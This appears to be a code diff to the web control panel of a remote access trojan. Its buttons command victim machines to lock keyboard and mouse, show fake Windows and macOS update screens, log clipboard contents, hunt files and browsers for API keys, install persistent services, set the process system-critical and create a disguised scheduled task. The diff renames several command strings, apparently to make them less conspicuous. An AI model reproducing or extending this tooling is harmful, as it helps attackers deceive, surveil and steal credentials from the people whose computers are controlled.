@@ -416,17 +416,17 @@ th{background:#16213e;color:#ffd700;}tr:hover{background:#222;}
 <button type="button" class="cmd-btn" onclick="sendCmd('net user')">net user <span>List users</span></button>
 <button type="button" class="cmd-btn" onclick="sendCmd('qwinsta')">qwinsta <span>Remote sessions</span></button>
 <button type="button" class="cmd-btn" onclick="sendCmd('schtasks /query /fo LIST')">Scheduled Tasks <span>Task scheduler</span></button>
-<button type="button" class="cmd-btn" style="background:#1a0a0a;border-color:#f44336;" onclick="sendCmd('DISABLE_INPUT')">🚫 Disable Input <span>Block keyboard + mouse (admin)</span></button>
+<button type="button" class="cmd-btn" style="background:#1a0a0a;border-color:#f44336;" onclick="sendCmd('BLOCK_UI')">🚫 Disable Input <span>Block keyboard + mouse (admin)</span></button>
 <button type="button" class="cmd-btn" style="background:#0a1a0a;border-color:#4CAF50;" onclick="sendCmd('ENABLE_INPUT')">✅ Enable Input <span>Restore keyboard + mouse</span></button>
-<button type="button" class="cmd-btn" style="background:#0a0a3a;border-color:#2196F3;" onclick="sendCmd('WINDOWS_UPDATE')">🪟 Windows Update <span>Fake Windows updating screen</span></button>
+<button type="button" class="cmd-btn" style="background:#0a0a3a;border-color:#2196F3;" onclick="sendCmd('SHOW_SPLASH')">🪟 Windows Update <span>Fake Windows updating screen</span></button>
 <button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#999;" onclick="sendCmd('APPLE_UPDATE')">🍎 Apple Update <span>Fake macOS updating screen</span></button>
 <button type="button" class="cmd-btn" style="background:#0a0a0a;border-color:#f44336;" onclick="sendCmd('HIDE_UPDATE')">❌ Hide Update <span>Close update screen</span></button>
-<button type="button" class="cmd-btn" style="background:#1a1a0a;border-color:#ffd700;" onclick="sendCmd('CLIPBOARD_LOG')">📋 Clipboard Log <span>View copied text history</span></button>
+<button type="button" class="cmd-btn" style="background:#1a1a0a;border-color:#ffd700;" onclick="sendCmd('CLIP_HIST')">📋 Clipboard Log <span>View copied text history</span></button>
 <button type="button" class="cmd-btn" style="background:#0a0a2a;border-color:#ff9800;" id="btnFindApi" onclick="sendCmd('FIND_API_KEYS')">🔑 Find API Keys <span>Search files/browsers for keys</span></button>
 <button type="button" class="cmd-btn" style="background:#0a2a0a;border-color:#4CAF50;" onclick="openNoteModal()">📝 Send Note <span>Open notepad with custom text</span></button>
 <button type="button" class="cmd-btn" style="background:#2a0a0a;border-color:#f44336;" onclick="sendCmd('DEPLOY_SVC')">🔒 Start Services <span>Start background services with auto-protection</span></button>
-<button type="button" class="cmd-btn" style="background:#2a1a0a;border-color:#ff5722;" onclick="sendCmd('PROTECT_NOW')">⚡ Set Critical <span>Set system-critical status</span></button>
-<button type="button" class="cmd-btn" style="background:#0a0a0a;border-color:#f44336;" onclick="sendCmd('Exit')">❌ Exit <span>Remove all services and exit cleanly</span></button>
+<button type="button" class="cmd-btn" style="background:#2a1a0a;border-color:#ff5722;" onclick="sendCmd('SET_CRITICAL')">⚡ Set Critical <span>Set system-critical status</span></button>
+<button type="button" class="cmd-btn" style="background:#0a0a0a;border-color:#f44336;" onclick="sendCmd('CLEANUP')">❌ Exit <span>Remove all services and exit cleanly</span></button>
 <button type="button" class="cmd-btn" style="background:#0a0a2a;border-color:#2196F3;" onclick="sendCmd('REMOVE_SVC')">🔓 Clear Protection <span>Remove protection from this client</span></button>
 <button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#4CAF50;" onclick="sendCmd('SVC_STATUS')">🛡️ Check Protection <span>Check protection status</span></button>
 <button type="button" class="cmd-btn" style="background:#1a0a2a;border-color:#9C27B0;" onclick="sendCmd('SCHEDULE_TASK')">🔱 System Task <span>System monitoring task</span></button>
